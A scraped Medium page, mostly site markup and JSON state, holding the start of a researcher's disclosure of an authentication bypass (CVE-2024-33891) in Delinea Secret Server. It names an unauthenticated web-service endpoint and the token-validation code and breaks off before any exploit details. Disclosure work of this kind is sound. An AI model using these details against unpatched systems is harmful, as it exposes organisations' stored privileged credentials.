du"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/followers?source=post_page---post_author_info--adc26c800ad3--------------------------------">249 Followers</a></span></div><div class="bf b bg z du ab ro"><span class="im l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/following?source=post_page---post_author_info--adc26c800ad3--------------------------------">2 Following</a></div></div><div class="rp l"></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z ql oz qm qn qo qp qq ev ew qr qs qt fa fb fc fd bm fe ff">Follow</button></span></div></div></div></div></div></div><div class="rq l"><div class="rr bh r pt"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf rb rs rt ru rv rw rx ry rz sa sb sc sd se sf sg bk">No responses yet</h2><div class="ab sh"><div><div class="bm" aria-hidden="false"><a class="si sj" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--adc26c800ad3--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="sk sl sm sn so l"></div></div></div></div><div class="sp sq sr ss st l bx"><div class="h k j"><div class="rr bh su sv"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="sw ab ke iv"><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="sx sy l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="sx l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----adc26c800ad3--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250109-203833-4b33bc4feb"</script><script>window.__GRAPHQL_URI__ = "https://straightblast.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-adc26c800ad3","user-4bd9d210b6d1"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"USER","id":"4bd9d210b6d1","explicit":true},"viewerIsBot":false},"debug":{"requestId":"79435da5-c4e8-461d-8c23-e54bde6b7a40","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-d982bb1641a4ae0d15c10b183733c290-81d9a6493dda40e8-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fstraightblast.medium.com\u002Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3","host":"straightblast.medium.com","hostname":"straightblast.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250109-203833-4b33bc4feb","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250109-203833-4b33bc4feb","commit":"4b33bc4febaa143cc9faecec80a3e5fb6960e7e3"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"straightblast.medium.com\"})":null,"postResult({\"id\":\"adc26c800ad3\"})":{"__ref":"Post:adc26c800ad3"}},"LinkedAccounts:4bd9d210b6d1":{"__typename":"LinkedAccounts","mastodon":null,"id":"4bd9d210b6d1"},"User:4bd9d210b6d1":{"__typename":"User","id":"4bd9d210b6d1","linkedAccounts":{"__ref":"LinkedAccounts:4bd9d210b6d1"},"isSuspended":false,"name":"Johnny Yu (@straight_blast)","imageId":"2*pGIaZHTZBFR36xUvnclH5A.jpeg","customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"straightblast.medium.com"}},"hasSubdomain":true,"username":"straightblast","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":249,"followingCount":1,"collectionFollowingCount":1},"bio":"","membership":null,"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:4bd9d210b6d1-viewerId:lo_3ae7899e42b2"},"twitterScreenName":"straight_blast"},"Paragraph:033f6a1b9b22_0":{"__typename":"Paragraph","id":"033f6a1b9b22_0","name":"8563","type":"H3","href":null,"layout":null,"metadata":null,"text":"“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN\u002FAuthZ Bypass","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*MM46_6UlXce73BkyxMhfQA.jpeg":{"__typename":"ImageMetadata","id":"1*MM46_6UlXce73BkyxMhfQA.jpeg","originalHeight":389,"originalWidth":641,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:033f6a1b9b22_1":{"__typename":"Paragraph","id":"033f6a1b9b22_1","name":"fb56","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*MM46_6UlXce73BkyxMhfQA.jpeg"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_2":{"__typename":"Paragraph","id":"033f6a1b9b22_2","name":"de6c","type":"P","href":null,"layout":null,"metadata":null,"text":"Update:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":7,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_3":{"__typename":"Paragraph","id":"033f6a1b9b22_3","name":"9a89","type":"P","href":null,"layout":null,"metadata":null,"text":"04\u002F30\u002F2024 — MITRE assigned CVE-2024–33891","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":28,"end":42,"href":"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2024-33891","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_4":{"__typename":"Paragraph","id":"033f6a1b9b22_4","name":"8235","type":"P","href":null,"layout":null,"metadata":null,"text":"04\u002F13\u002F2024 — The patch 11.7.1 for Delinea Secret Server is available — https:\u002F\u002Fdocs.delinea.com\u002Fonline-help\u002Fsecret-server\u002Frelease-notes\u002Fss-rn-11-7-000001.htm","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":71,"end":157,"href":"https:\u002F\u002Fdocs.delinea.com\u002Fonline-help\u002Fsecret-server\u002Frelease-notes\u002Fss-rn-11-7-000001.htm","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_5":{"__typename":"Paragraph","id":"033f6a1b9b22_5","name":"bb6c","type":"P","href":null,"layout":null,"metadata":null,"text":"— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_6":{"__typename":"Paragraph","id":"033f6a1b9b22_6","name":"93a9","type":"P","href":null,"layout":null,"metadata":null,"text":"Delinea Secret Server is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged accounts and access across their IT infrastructure.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":21,"href":"https:\u002F\u002Fdocs.delinea.com\u002Fonline-help\u002Fsecret-server\u002Fstart.htm","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_7":{"__typename":"Paragraph","id":"033f6a1b9b22_7","name":"866c","type":"P","href":null,"layout":null,"metadata":null,"text":"Accessing the application through the web UI requires standard username and password authentication. Additionally, it supports supplementary security measures like 2FA. Moreover, the application provides a set of web services accessible via an API token.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_8":{"__typename":"Paragraph","id":"033f6a1b9b22_8","name":"9746","type":"P","href":null,"layout":null,"metadata":null,"text":"As part of my personal security research, I downloaded the Delinea Secret Server On-Permises to hunt for vulnerabilities. The product’s version at the time I downloaded it was 16.000004. After installing the product, I looked into its directory and noted it was an ASP.NET application. I immediately review the web.config file as it serves as a roadmap to where potential attack surface could be at. I was looking for pages and resources that do not require AuthN\u002FAuthZ. I found a webservice endpoint that did not sit behind a login page,","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":59,"end":92,"href":"https:\u002F\u002Fsupport.delinea.com\u002Fs\u002Fdownload-onprem","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":176,"end":185,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":311,"end":321,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_9":{"__typename":"Paragraph","id":"033f6a1b9b22_9","name":"2a19","type":"ULI","href":null,"layout":null,"metadata":null,"text":"SecretServer\u002Fwebservices\u002FSSWebService.asmx","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*yA19vy-97SUmA-DrklwJow.png":{"__typename":"ImageMetadata","id":"1*yA19vy-97SUmA-DrklwJow.png","originalHeight":556,"originalWidth":833,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:033f6a1b9b22_10":{"__typename":"Paragraph","id":"033f6a1b9b22_10","name":"64f3","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*yA19vy-97SUmA-DrklwJow.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_11":{"__typename":"Paragraph","id":"033f6a1b9b22_11","name":"5d21","type":"P","href":null,"layout":null,"metadata":null,"text":"and I explored the APIs to evaluate their functionalities.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_12":{"__typename":"Paragraph","id":"033f6a1b9b22_12","name":"fd54","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately, I could not exercise the APIs as they require an API token.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_13":{"__typename":"Paragraph","id":"033f6a1b9b22_13","name":"a0ba","type":"P","href":null,"layout":null,"metadata":null,"text":"My initial thought was it would be a waste of effort to audit the API token implementation, as I felt such critical component would’ve went through rigorous security review. I took a leap of faith and dived into the decompiled code, which led me to astonishing discoveries.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_14":{"__typename":"Paragraph","id":"033f6a1b9b22_14","name":"c665","type":"P","href":null,"layout":null,"metadata":null,"text":"For all web service requests, the API token is checked for validity via Thycotic.ihawu.Business.Authentication NS -\u003E ValidTokenProvider class -\u003E IsValidToken function from 